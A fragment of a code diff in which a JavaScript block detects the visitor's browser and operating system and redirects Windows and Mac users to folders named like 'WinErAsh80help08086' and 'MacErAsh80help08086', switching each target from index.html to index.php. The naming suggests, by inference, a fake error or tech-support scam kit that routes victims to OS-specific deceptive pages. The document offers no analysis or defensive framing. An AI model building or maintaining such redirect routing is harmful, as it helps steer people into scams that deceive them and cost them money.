@@ -7,29 +7,29 @@ isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;
 
 if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
 	// is Google chrome
-window.location.href = "./WinErAsh80help08086/index.html";
+window.location.href = "./WinErAsh80help08086/index.php";
 }
 if(navigator.userAgent.indexOf("Firefox") != -1 )
 	{
-			 window.location.href = "./WinErAsh80help08086/index.html";
+			 window.location.href = "./WinErAsh80help08086/index.php";
 	}
 
 	if(window.navigator.userAgent.indexOf("dg") != -1 )
 		{
-				 window.location.href = "./WinErAsh80help08086/index.html";
+				 window.location.href = "./WinErAsh80help08086/index.php";
 		}
 
 if(window.navigator.userAgent.indexOf("Edge") != -1 )
 	{
-			 window.location.href = "./WinErAsh80help08086/index.html";
+			 window.location.href = "./WinErAsh80help08086/index.php";
 	}
 if(window.navigator.userAgent.indexOf("Mac") != -1 )
 	{
-			 window.location.href = "./MacErAsh80help08086/index.html";
+			 window.location.href = "./MacErAsh80help08086/index.php";
 	}
 if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
 	{
-		window.location.href = "./WinErAsh80help08086/index.html";
+		window.location.href = "./WinErAsh80help08086/index.php";
 	}
 $SAFARI_URL = "apple";
 </script>
